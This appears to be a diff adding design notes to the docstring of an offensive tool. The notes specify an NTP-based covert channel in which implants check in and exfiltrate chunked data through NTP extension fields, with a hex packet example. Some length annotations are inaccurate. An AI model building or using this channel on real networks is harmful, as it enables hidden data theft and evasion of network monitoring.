@@ -28,6 +28,84 @@ All this does is store chunks of responses until it's fully there, then the key 
 Should be flexible for other listeners that want to do chunking as well, and keeps the logic out of the main listener
 code.
 
+Extension Fields:
+----
+
+Extension Field layout. This comes after the 48 byte NTP packet
+-----------------------------------------------
+| Bytes | Description                          |
+|-------|--------------------------------------|
+| 0-1   | Extension Field Type (2 bytes)       |
+| 2-3   | Extension Field Length (2 bytes)     |
+| 4-7   | Session ID (4 bytes), makes sure uniqueness when talking to server
+| 8-?   | Data of extension fields             |
+-----------------------------------------------
+
+Remeber: The NTP packet is just a vessel. It has no idea about specific implementations. All
+the data is stored in the extension fields.
+
+
+Each NTP packet should have:
+1. UUID extension field: Identifies the implant checking in.
+2. Data extension field: contains the data.
+
+Final:
+---
+
+Standard NTP Packet Layout (48 bytes total)
+---------------------------------------------------------------------------------
+| Bytes | Description                                                           |
+|-------|-----------------------------------------------------------------------|
+| 0     | LI (Leap Indicator, 2 bits), Version (3 bits), Mode (3 bits)          |
+| 1     | Stratum (1 byte), indicates the distance from the primary clock       |
+| 2     | Poll Interval (1 byte), maximum interval between messages             |
+| 3     | Precision (1 byte), precision of the local clock                      |
+| 4-7   | Root Delay (4 bytes), total roundtrip delay to the primary reference  |
+| 8-11  | Root Dispersion (4 bytes), maximum error relative to the primary      |
+| 12-15 | Reference ID (4 bytes), identifies the particular reference clock     |
+| 16-23 | Reference Timestamp (8 bytes), time the clock was last set/corrected  |
+| 24-31 | Origin Timestamp (8 bytes), time request departed the client          |
+| 32-39 | Receive Timestamp (8 bytes), time request arrived at the server       |
+| 40-47 | Transmit Timestamp (8 bytes), time reply departed the server          |
+---------------------------------------------------------------------------------
+
+Pcket:
+
+```
+23 02 09 EC 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+# Extension 1:
+00 01 00 18 DE AD BE EF 55 0E 84 00 E2 9B 41 D4
+A7 16 44 66 55 44 00 00
+
+> Field: 00 01
+> Length: 00 18 (24 bytes of data)
+> Session ID: DE AD BE EF
+> Data: 55 0E 84 00 E2 9B 41 D4 A7 16 44 66 55 44 00 00 (UUID)
+
+#extension 2:
+00 02 00 10 DE AD BE EF
+48 45 4C 4C 4F 00 00 00
+
+> Field: 00 02
+> Length: 00 10 (16 bytes of data)
+> Session ID: DE AD BE EF (same session ID as before, so we know it's part of the same message)
+> Data: 48 45 4C 4C 4F 00 00 00 (the message "HELLO" in ASCII, padded to 16 bytes)
+
+
+Packets needed:
+
+GET packet:
+- UUID Field with implant UUID
+
+POST packet:
+- UUID Field with implant UUID
+- Data Field with data to exfiltrate (chunked if needed, with chunk number and total chunks in the extension header)
+
+```
+
 """
 
 import socket
